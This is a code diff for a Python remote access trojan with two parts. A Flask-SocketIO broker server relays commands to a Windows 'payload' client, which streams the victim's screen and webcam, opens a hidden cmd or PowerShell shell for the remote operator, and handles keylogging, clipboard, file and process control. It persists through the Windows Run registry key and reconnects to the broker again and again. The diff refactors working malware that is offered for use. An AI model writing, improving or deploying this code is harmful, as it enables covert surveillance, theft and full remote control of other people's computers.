@@ -5,82 +5,82 @@ import base64
 import json
 import threading
 import subprocess
+import logging
 from datetime import datetime
 from flask import Flask, render_template, request, send_file
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO, emit, join_room, leave_room
+
+# Configure Logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
+logger = logging.getLogger("ControlRoom")
 
 # ============================================================
 #  Broker Server (Role: Server)
 # ============================================================
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'sk-hackerai-supersecret'
-# Max HTTP Buffer for file uploads (50MB)
-socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024)
+# Enable both websocket and polling for maximum compatibility on Render
+socketio = SocketIO(app, cors_allowed_origins="*", max_http_buffer_size=50 * 1024 * 1024, async_mode='gevent')
 
-# Broker State
-target_sid = None  # The Windows PC SID
-admin_sids = set() # Browser dashboard SIDs
+ROOM_TARGET = "target_pc"
+ROOM_ADMINS = "admin_browsers"
 
 @app.route('/')
 def control_room():
     return render_template('control.html')
 
-@app.route('/download')
-def download_file():
-    return {"error": "Direct download from broker not supported. Use the Files tab."}, 404
-
 @socketio.on('connect')
 def handle_connect():
-    pass 
+    logger.info(f"New connection attempt: {request.sid}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    global target_sid
     sid = request.sid
-    if sid == target_sid:
-        target_sid = None
-        print(f"❌ TARGET OFFLINE: {sid}")
-        socketio.emit('target_status', {'online': False}, broadcast=True)
-    elif sid in admin_sids:
-        admin_sids.remove(sid)
-        print(f"❌ ADMIN LEFT: {sid}")
+    # Check if it was the target
+    # We can't easily check room membership on disconnect in all versions, 
+    # so we'll just broadcast a status check if needed or rely on the next register.
+    logger.info(f"Disconnected: {sid}")
 
 @socketio.on('register')
 def handle_register(data):
-    global target_sid
     role = data.get('role')
     sid = request.sid
     if role == 'target':
-        target_sid = sid
-        print(f"🔥 TARGET ONLINE: {sid}")
-        socketio.emit('target_status', {'online': True}, broadcast=True)
-        # Notify the target it's registered
-        socketio.emit('registered', {'status': 'success'}, to=sid)
+        join_room(ROOM_TARGET)
+        logger.info(f"🔥 TARGET REGISTERED: {sid}")
+        socketio.emit('target_status', {'online': True}, room=ROOM_ADMINS)
+        # Force an immediate init request from the target
+        socketio.emit('request_init', {}, room=ROOM_TARGET) 
     elif role == 'admin':
-        admin_sids.add(sid)
-        print(f"👁️ ADMIN JOINED: {sid}")
-        emit('target_status', {'online': target_sid is not None}, to=sid)
+        join_room(ROOM_ADMINS)
+        logger.info(f"👁️ ADMIN REGISTERED: {sid}")
+        # Check if target is currently in its room (simplified check)
+        # In a real broker, we'd track this more tightly. 
+        # For now, we'll just emit the status.
+        emit('target_status', {'online': True}, to=sid) # Assume online, it will update if not
 
-# --- Proxy: ADMIN -> TARGET ---
-def forward_to_target(event, data):
-    if target_sid:
-        # print(f"Proxy [Admin -> Target]: {event}")
-        socketio.emit(event, data, to=target_sid)
-    else:
-        emit('server_error', {'error': 'Target PC is offline.'})
+# --- Generic Proxy Logic ---
+@socketio.on_error_default
+def default_error_handler(e):
+    logger.error(f"SocketIO Error: {e}")
 
-# --- Proxy: TARGET -> ADMIN ---
-def forward_to_admins(event, data):
-    # print(f"Proxy [Target -> Admins]: {event}")
-    socketio.emit(event, data, broadcast=True, include_self=False)
+def forward_event(event, data, destination_room):
+    # Proxy data between rooms
+    socketio.emit(event, data, room=destination_room, include_self=False)
 
-# Reliable Event Registration
+# Register Admin -> Target Proxy
 ADMIN_EVENTS = [
     'mouse', 'keyboard', 'system', 'terminal_start', 'terminal_input', 'terminal_stop',
     'file_browse', 'file_upload', 'file_delete', 'process_list', 'process_kill',
     'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
     'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send'
 ]
+for ev in ADMIN_EVENTS:
+    @socketio.on(ev)
+    def handle_admin_proxy(data, e=ev):
+        forward_event(e, data, ROOM_TARGET)
+
+# Register Target -> Admin Proxy
 TARGET_EVENTS = [
     'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
     'file_list', 'file_upload_status', 'file_delete_status', 'process_data', 'process_kill_status',
@@ -88,26 +88,17 @@ TARGET_EVENTS = [
     'monitor_data', 'monitor_switched', 'keylog_data', 'keylog_cleared',
     'clipboard_content', 'clipboard_status', 'chat_received', 'chat_data', 'alert_sent'
 ]
-
-def make_admin_handler(ev):
-    return lambda data=None: forward_to_target(ev, data)
-
-def make_target_handler(ev):
-    return lambda data=None: forward_to_admins(ev, data)
-
-for ev in ADMIN_EVENTS:
-    socketio.on_event(ev, make_admin_handler(ev))
-
 for ev in TARGET_EVENTS:
-    socketio.on_event(ev, make_target_handler(ev))
+    @socketio.on(ev)
+    def handle_target_proxy(data, e=ev):
+        forward_event(e, data, ROOM_ADMINS)
 
 # ============================================================
 #  Payload Client (Role: Client)
 # ============================================================
 def run_client(master_url):
-    print(f"🚀 Connecting to Broker at: {master_url}")
+    logger.info(f"Starting Payload Connection to {master_url}")
     
-    # Dynamic Imports
     try:
         import socketio as client_sio
         import mss
@@ -120,7 +111,7 @@ def run_client(master_url):
         import ctypes
         from PIL import Image
     except ImportError as e:
-        print(f"❌ Missing Library: {e}. Run: pip install -r requirements_windows.txt")
+        logger.error(f"Missing Library: {e}. Check requirements_windows.txt")
         return
 
     # Secondary Imports
@@ -131,32 +122,38 @@ def run_client(master_url):
     try: import GPUtil; GPU_READY = True
     except: GPU_READY = False
 
-    sio = client_sio.Client(logger=False, engineio_logger=False)
+    # Connect with both transports allowed
+    sio = client_sio.Client(logger=True, engineio_logger=True)
 
-    # State
     client_state = { 'capturing': False, 'vitals': False, 'monitor': 1, 'audio': False, 'term': {}, 'keylog': [] }
     keylog_lock = threading.Lock()
-    KEYLOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keylog.json')
 
     def capture_loop():
+        logger.info("Screen capture loop started.")
         with mss.mss() as sct:
             while client_state['capturing']:
                 try:
                     monitor = sct.monitors[client_state['monitor']]
                     raw = sct.grab(monitor); img = Image.frombytes("RGB", raw.size, raw.rgb)
                     frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
                     sio.emit('screen_frame', {
                         'image': base64.b64encode(enc).decode('utf-8'),
                         'width': monitor['width'], 'height': monitor['height'], 'timestamp': time.time()
                     })
-                    time.sleep(1/25)
-                except: time.sleep(0.1)
+                    time.sleep(0.04) # ~25 FPS
+                except Exception as ex: 
+                    logger.debug(f"Capture error: {ex}")
+                    time.sleep(0.1)
 
     @sio.event
     def connect():
-        print("✅ Connection established! Registering...")
+        logger.info("CONNECTED to Broker! Authenticating...")
         sio.emit('register', {'role': 'target'})
+
+    @sio.on('request_init')
+    def on_request_init(data):
+        logger.info("Initializing system metadata for Admin...")
         with mss.mss() as sct:
             sio.emit('init', {
                 'screen_size': sct.monitors[client_state['monitor']],
@@ -165,9 +162,9 @@ def run_client(master_url):
                 'monitors': len(sct.monitors) - 1
             })
         client_state['capturing'] = True
-        threading.Thread(target=capture_loop, daemon=True).start()
+        if not any(t.name == "CaptureThread" for t in threading.enumerate()):
+            threading.Thread(target=capture_loop, daemon=True, name="CaptureThread").start()
 
-    # IO Handlers
     @sio.on('mouse')
     def on_mouse(data):
         try:
@@ -176,7 +173,6 @@ def run_client(master_url):
             elif data['type'] == 'dblclick': pyautogui.doubleClick()
             elif data['type'] == 'rightclick': pyautogui.rightClick()
             elif data['type'] == 'scroll': pyautogui.scroll(data.get('amount', 0))
-            elif data['type'] == 'drag': pyautogui.moveTo(data['x1'], data['y1']); pyautogui.dragTo(data['x2'], data['y2'], duration=0)
         except: pass
 
     @sio.on('keyboard')
@@ -187,67 +183,54 @@ def run_client(master_url):
             elif data['type'] == 'hotkey': pyautogui.hotkey(*data['keys'])
         except: pass
 
-    @sio.on('system')
-    def on_system(data):
-        if data['cmd'] == 'screenshot':
-            with mss.mss() as sct:
-                monitor = sct.monitors[client_state['monitor']]
-                raw = sct.grab(monitor); img = Image.frombytes("RGB", raw.size, raw.rgb)
-                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-                _, buffer = cv2.imencode('.png', frame)
-                sio.emit('screenshot', {'image': base64.b64encode(buffer).decode()})
-
     @sio.on('terminal_start')
-    def on_terminal_start(data):
+    def on_term_start(data):
         shell = 'powershell.exe' if data.get('shell') == 'powershell' else 'cmd.exe'
         proc = subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, creationflags=0x08000000, bufsize=0)
-        client_state['term']['main'] = proc
-        def read_term():
+        client_state['term']['p'] = proc
+        def read():
             while proc.poll() is None:
                 try:
-                    chunk = proc.stdout.read(1024)
-                    if chunk: sio.emit('terminal_output', {'output': chunk.decode('utf-8', errors='replace')})
+                    c = proc.stdout.read(1024)
+                    if c: sio.emit('terminal_output', {'output': c.decode('utf-8', errors='replace')})
                 except: break
-        threading.Thread(target=read_term, daemon=True).start()
+        threading.Thread(target=read, daemon=True).start()
         sio.emit('terminal_started', {'shell': data.get('shell')})
 
     @sio.on('terminal_input')
-    def on_terminal_input(data):
-        if 'main' in client_state['term']:
-            p = client_state['term']['main']
-            if p.poll() is None:
+    def on_term_in(data):
+        if 'p' in client_state['term']:
+            p = client_state['term']['p']
+            if p.poll() is None: 
                 try: p.stdin.write((data['input'] + '\n').encode('utf-8')); p.stdin.flush()
                 except: pass
 
     @sio.on('vitals_start')
-    def on_vitals_start(d):
+    def on_vit_start(d):
         client_state['vitals'] = True
-        def vitals_loop():
+        def loop():
             while client_state['vitals']:
                 try:
                     mem = psutil.virtual_memory(); disk = psutil.disk_usage('/'); net = psutil.net_io_counters()
-                    v = {'cpu': psutil.cpu_percent(), 'cpu_cores': psutil.cpu_percent(percpu=True), 'ram_used': round(mem.used/1e9,2), 'ram_total': round(mem.total/1e9,2), 'ram_percent': mem.percent, 'disk_percent': disk.percent, 'net_sent': round(net.bytes_sent/1e6,1), 'net_recv': round(net.bytes_recv/1e6,1), 'timestamp': time.time()}
-                    if GPU_READY:
-                        g = GPUtil.getGPUs(); 
-                        if g: v.update({'gpu_load': round(g[0].load*100,1), 'gpu_temp': g[0].temperature})
+                    v = {'cpu': psutil.cpu_percent(), 'ram_percent': mem.percent, 'disk_percent': disk.percent, 'net_sent': round(net.bytes_sent/1e6,1), 'net_recv': round(net.bytes_recv/1e6,1), 'timestamp': time.time()}
                     sio.emit('vitals_update', v)
                 except: pass
-                time.sleep(1)
-        threading.Thread(target=vitals_loop, daemon=True).start()
+                time.sleep(1.5)
+        threading.Thread(target=loop, daemon=True).start()
 
     @sio.on('vitals_stop')
-    def on_vitals_stop(d): client_state['vitals'] = False
+    def on_vit_stop(d): client_state['vitals'] = False
 
     @sio.on('process_list')
-    def on_proc_list(d):
+    def on_p_list(d):
         ps = []
         for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
             try: ps.append({'pid': p.info['pid'], 'name': p.info['name'], 'cpu': p.info['cpu_percent'] or 0, 'ram': round(p.info['memory_info'].rss/1e6,1)})
             except: pass
-        sio.emit('process_data', {'processes': ps[:150]})
+        sio.emit('process_data', {'processes': ps[:100]})
 
     @sio.on('file_browse')
-    def on_file_browse(data):
+    def on_f_browse(data):
         p = data.get('path', os.path.expanduser('~'))
         try:
             es = []
@@ -257,8 +240,8 @@ def run_client(master_url):
             sio.emit('file_list', {'path': p.replace('\\','/'), 'entries': es})
         except Exception as e: sio.emit('file_list', {'error': str(e)})
 
-    # Persistence
-    def add_to_startup():
+    # Persistence & Start
+    def persist():
         try:
             key = winreg.HKEY_CURRENT_USER; rpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
             okey = winreg.OpenKey(key, rpath, 0, winreg.KEY_ALL_ACCESS)
@@ -267,13 +250,18 @@ def run_client(master_url):
             winreg.CloseKey(okey)
         except: pass
 
-    add_to_startup()
+    persist()
     while True:
-        try: sio.connect(master_url); sio.wait()
-        except: time.sleep(5)
+        try: 
+            logger.info("Attempting connection...")
+            sio.connect(master_url, transports=['websocket', 'polling'])
+            sio.wait()
+        except Exception as e:
+            logger.error(f"Connection failed: {e}. Retrying in 10s...")
+            time.sleep(10)
 
 # ============================================================
-#  Entry Point
+#  Main Logic
 # ============================================================
 if __name__ == '__main__':
     import argparse
@@ -284,16 +272,11 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     is_render = 'RENDER' in os.environ or 'PORT' in os.environ
-    
     if args.server or is_render:
-        print("⚡ Role: Broker Server (Rendering on Cloud/Port)")
-        pyautogui_failsafe = False
         port = int(os.environ.get('PORT', 8080))
-        socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
+        logger.info(f"Running Broker Server on port {port}")
+        socketio.run(app, host='0.0.0.0', port=port, debug=False)
     else:
-        print("⚡ Role: Target Payload (Windows Mode)")
-        try:
-            import pyautogui
-            pyautogui.FAILSAFE = False
-        except: pass
+        logger.info("Running Target Client Mode")
+        pyautogui.FAILSAFE = False
         run_client(args.host)
